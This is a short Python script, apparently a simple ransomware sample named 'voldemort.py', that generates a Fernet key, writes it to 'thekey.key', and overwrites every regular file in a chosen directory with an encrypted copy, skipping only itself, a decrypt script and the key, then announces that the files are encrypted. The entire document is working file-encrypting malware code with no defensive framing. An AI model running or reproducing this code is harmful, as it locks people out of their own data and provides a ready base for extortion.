#Code for Encrypting the Data

import os

from cryptography.fernet import Fernet

files = []

path = "pathname"  #Enter the File path here


for file in os.listdir(path):
	if file == 'voldemort.py'or file == "decrypt.py" or file == 'thekey.key':
		continue
	if os.path.isfile(file):
		files.append(file)


key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted =  Fernet(key).encrypt(contents)
	with open(file,'wb') as thefile:
		thefile.write(contents_encrypted)

print("Your files have been encypted !!!")
